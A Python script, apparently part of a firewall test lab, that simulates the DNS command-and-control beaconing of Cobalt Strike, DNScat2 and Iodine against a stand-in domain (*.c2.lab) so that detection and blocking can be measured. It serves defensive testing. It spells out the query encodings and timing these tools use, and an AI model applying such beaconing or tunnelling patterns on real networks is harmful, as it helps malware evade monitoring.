#!/usr/bin/env python3
"""
UC5 – C2 DNS Beaconing Simulation
====================================
Simulates the DNS-based command-and-control beaconing patterns of real malware
families WITHOUT sending to real C2 infrastructure.

Patterns implemented:
  cobaltstrike – Periodic A record queries (random 8-char hex subdomain)
                 simulating Cobalt Strike DNS beacon check-ins
  dnscat2      – TXT record queries with encoded payload subdomains,
                 simulating DNScat2 session establishment and data exchange
  iodine       – NS + NULL/TXT query sequence simulating Iodine DNS tunnel
                 setup handshake

The rogue DNS server (Azure CoreDNS) responds to *.c2.lab with random IPs,
standing in for a real C2 domain. The PAN-OS firewall should detect the
beaconing pattern (frequency, entropy, record types) and block it.

Modes:
  DRY_RUN=False  →  queries sent to DNS_RESOLVER (FW → rogue DNS *.c2.lab)
  DRY_RUN=True   →  queries only printed, nothing sent

Usage:
  python uc5_c2_dns.py [--pattern cobaltstrike] [--beacons 10]
  python uc5_c2_dns.py --pattern all --beacons 5
"""

import argparse
import json
import os
import random
import string
import sys
import time
from datetime import datetime

import dns.resolver
import dns.rdatatype
from colorama import Fore, Style, init
from tqdm import tqdm

sys.path.insert(0, os.path.dirname(__file__))
import config

init(autoreset=True)


# ---------------------------------------------------------------------------
# Beacon query generators
# ---------------------------------------------------------------------------

def _rand_hex(n: int) -> str:
    return "".join(random.choices("0123456789abcdef", k=n))


def _rand_alnum(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _rand_b64_chunk(n: int = 20) -> str:
    """Simulate a base64-encoded payload chunk, DNS-safe (no '+' '/')."""
    chars = string.ascii_letters + string.digits + "-_"
    return "".join(random.choices(chars, k=n))


def beacon_cobaltstrike(c2_domain: str, beacon_num: int) -> list[tuple[str, str]]:
    """
    Cobalt Strike DNS Beacon pattern:
    - Sends A record queries to random hex subdomain (8 chars).
    - Optionally alternates with a TXT query to retrieve a simulated task.
    Returns list of (fqdn, record_type) tuples.
    """
    queries = []
    # Check-in: A record
    sub = _rand_hex(8)
    queries.append((f"{sub}.{c2_domain}", "A"))
    # Every 3rd beacon: TXT query simulating task retrieval
    if beacon_num % 3 == 0:
        queries.append((f"cdn.{_rand_hex(4)}.{c2_domain}", "TXT"))
    return queries


def beacon_dnscat2(c2_domain: str, beacon_num: int) -> list[tuple[str, str]]:
    """
    DNScat2 beaconing pattern:
    - Session ID + sequence number + encoded payload chunk as TXT query.
    - Alternates between SYN (session setup), data, and ACK packets.
    """
    session_id = _rand_hex(4)
    seq = beacon_num
    packet_type = ["SYN", "MSG", "ACK"][beacon_num % 3]
    payload = _rand_b64_chunk(random.randint(12, 24))

    # DNScat2 label: <encoded_data>.<session>.<seq>.<c2>
    fqdn = f"{payload}.{session_id}.{seq:04x}.{c2_domain}"
    queries = [(fqdn, "TXT")]

    # DNScat2 also does CNAME queries for tunnelling
    if beacon_num % 5 == 0:
        queries.append((f"x.{session_id}.{c2_domain}", "CNAME"))
    return queries


def beacon_iodine(c2_domain: str, beacon_num: int) -> list[tuple[str, str]]:
    """
    Iodine DNS tunnel beaconing pattern:
    - Version check: NULL/TXT query to version.<c2>
    - Login: CNAME query with encoded credentials
    - Data: NULL queries with binary payload encoded as subdomains
    Simulated with TXT and A queries (NULL not always supported).
    """
    queries = []
    if beacon_num == 0:
        # Handshake / version negotiation
        queries.append((f"version.{c2_domain}", "TXT"))
        queries.append((f"login.{_rand_b64_chunk(16)}.{c2_domain}", "TXT"))
    else:
        # Data transfer: encoded binary data in subdomain
        chunk = _rand_b64_chunk(random.randint(20, 50))
        # Truncate to valid DNS label (<= 63 chars)
        chunk = chunk[:63]
        queries.append((f"{chunk}.{c2_domain}", "TXT"))
    # Keepalive A query
    queries.append((f"ping.{_rand_hex(4)}.{c2_domain}", "A"))
    return queries


PATTERNS = {
    "cobaltstrike": beacon_cobaltstrike,
    "dnscat2":      beacon_dnscat2,
    "iodine":       beacon_iodine,
}


# ---------------------------------------------------------------------------
# DNS query sender
# ---------------------------------------------------------------------------

def send_query(resolver_obj, fqdn: str, rtype: str) -> dict:
    try:
        answers = resolver_obj.resolve(fqdn, rtype)
        rrset = [r.to_text() for r in answers]
        return {"fqdn": fqdn, "type": rtype, "status": "RESOLVED", "response": rrset}
    except dns.resolver.NXDOMAIN:
        return {"fqdn": fqdn, "type": rtype, "status": "BLOCKED_NXDOMAIN", "response": []}
    except dns.resolver.NoAnswer:
        return {"fqdn": fqdn, "type": rtype, "status": "NO_ANSWER", "response": []}
    except dns.resolver.Timeout:
        return {"fqdn": fqdn, "type": rtype, "status": "TIMEOUT", "response": []}
    except Exception as e:
        return {"fqdn": fqdn, "type": rtype, "status": "ERROR", "response": [], "error": str(e)}


STATUS_COLOR = {
    "RESOLVED":         Fore.RED,
    "BLOCKED_NXDOMAIN": Fore.GREEN,
    "NO_ANSWER":        Fore.GREEN,
    "TIMEOUT":          Fore.YELLOW,
    "ERROR":            Fore.MAGENTA,
}


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="UC5 – C2 DNS Beaconing Simulation")
    parser.add_argument("--pattern", default=",".join(config.C2_PATTERNS),
                        help="Pattern(s): cobaltstrike,dnscat2,iodine  or  all")
    parser.add_argument("--c2-domain", default=config.C2_BASE_DOMAIN)
    parser.add_argument("--resolver", default=config.DNS_RESOLVER)
    parser.add_argument("--beacons", type=int, default=config.C2_BEACON_COUNT)
    parser.add_argument("--dry-run", action="store_true", default=config.DRY_RUN)
    args = parser.parse_args()

    selected = list(PATTERNS.keys()) if args.pattern.strip().lower() == "all" else [
        p.strip() for p in args.pattern.split(",")
    ]

    print(f"\n{'='*70}")
    print(f"  UC5 – C2 DNS Beaconing Simulation")
    print(f"  Resolver  : {args.resolver}")
    print(f"  C2 domain : {args.c2_domain}")
    print(f"  Patterns  : {', '.join(selected)}")
    print(f"  Beacons   : {args.beacons} per pattern")
    print(f"  Dry-run   : {args.dry_run}")
    print(f"{'='*70}\n")

    if not args.dry_run:
        resolver = dns.resolver.Resolver(configure=False)
        resolver.nameservers = [args.resolver]
        resolver.timeout = config.QUERY_TIMEOUT
        resolver.lifetime = config.QUERY_TIMEOUT

    all_results = {}

    for pattern_name in selected:
        if pattern_name not in PATTERNS:
            print(f"{Fore.YELLOW}[!] Unknown pattern: {pattern_name} – skipping")
            continue

        beacon_fn = PATTERNS[pattern_name]
        print(f"\n{Fore.CYAN}  ── {pattern_name.upper()} beacon ({args.beacons} cycles) ──")

        results = []
        for beacon_num in tqdm(range(args.beacons), desc=f"  {pattern_name}", unit="beacon"):
            queries = beacon_fn(args.c2_domain, beacon_num)

            for fqdn, rtype in queries:
                if args.dry_run:
                    print(f"  {Fore.YELLOW}[DRY]{Style.RESET_ALL} [{rtype:<5}] {fqdn}")
                    results.append({"fqdn": fqdn, "type": rtype, "status": "DRY_RUN", "response": []})
                else:
                    r = send_query(resolver, fqdn, rtype)
                    results.append(r)
                    color = STATUS_COLOR.get(r["status"], Fore.WHITE)
                    resp = ", ".join(r["response"][:2]) if r["response"] else "-"
                    if len(resp) > 50:
                        resp = resp[:50] + "…"
                    print(
                        f"  [{rtype:<5}] {fqdn:<60} "
                        f"{color}{r['status']}{Style.RESET_ALL}  {resp}"
                    )

            # Randomised beacon interval
            if not args.dry_run:
                interval = random.uniform(config.C2_BEACON_INTERVAL_MIN, config.C2_BEACON_INTERVAL_MAX)
                time.sleep(interval)

        all_results[pattern_name] = results

    if args.dry_run:
        print(f"\n{Fore.YELLOW}[DRY-RUN] No queries sent.")
        return

    # Summary
    print(f"\n{'='*70}")
    print(f"  RESULTS SUMMARY (per pattern)")
    for pname, results in all_results.items():
        blocked  = sum(1 for r in results if "BLOCKED" in r["status"] or r["status"] == "NO_ANSWER")
        resolved = sum(1 for r in results if r["status"] == "RESOLVED")
        total    = len(results)
        print(f"  {pname:<15} {total} queries  Blocked: {Fore.GREEN}{blocked:<4}{Style.RESET_ALL} Resolved: {Fore.RED}{resolved}{Style.RESET_ALL}")
    print(f"{'='*70}\n")

    os.makedirs(config.RESULTS_DIR, exist_ok=True)
    out_file = os.path.join(config.RESULTS_DIR, f"uc5_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(out_file, "w") as f:
        json.dump({
            "resolver":   args.resolver,
            "c2_domain":  args.c2_domain,
            "timestamp":  datetime.now().isoformat(),
            "patterns": {
                pname: {
                    "query_count": len(res),
                    "blocked": sum(1 for r in res if "BLOCKED" in r["status"] or r["status"] == "NO_ANSWER"),
                    "resolved": sum(1 for r in res if r["status"] == "RESOLVED"),
                    "queries": res,
                }
                for pname, res in all_results.items()
            }
        }, f, indent=2)
    print(f"{Fore.CYAN}[*] Results saved to: {out_file}")


if __name__ == "__main__":
    main()
